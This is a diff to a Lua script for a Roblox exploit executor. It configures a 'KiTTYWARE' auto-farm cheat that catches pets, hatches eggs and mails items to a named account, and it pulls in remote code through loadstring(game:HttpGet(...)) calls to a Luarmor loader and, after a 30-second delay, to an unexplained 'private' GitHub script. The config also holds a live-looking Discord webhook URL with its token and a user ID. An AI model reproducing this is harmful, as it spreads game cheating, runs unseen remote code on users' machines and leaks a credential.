@@ -1,6 +1,22 @@
 repeat wait() until game:IsLoaded()
 task.spawn(function()
-loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
+getgenv().KiTTYWARE_ElementalWorld = {
+    Catch_Huges = true,
+    Complete_Trainer_Quests = true,
+
+    Auto_Cube_Merchant = true,
+
+    Hatch_Last_Egg = true,
+    Farm_Last_Zone = true,
+    Pets_Per_Breakable = 5,
+
+    discord_Webhook = "https://discord.com/api/webhooks/1258856797612146720/0vPuFXEwbQLDOR4B6Tw-cGLgWc_zInzPVjzmsVN_65R5JfAiwSDHZNK6q-CMk28eTRqD",
+    discord_UserID = "484739592239579136",
+    mail_Enabled = true,
+    mail_Username = "DespacitoCross",
+    Fps_Boost = true,
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/bf88f8790b3e6c196d51b59dc600c9ee.lua"))()
 end)
 
 task.spawn(function()
@@ -11,4 +27,9 @@ StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
 game:GetService('StarterGui'):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
 
 game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
+end)
+
+task.spawn(function()
+    task.wait(30)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/crztesting/privatefldr/main/PrvUsefulSC"))()
 end)
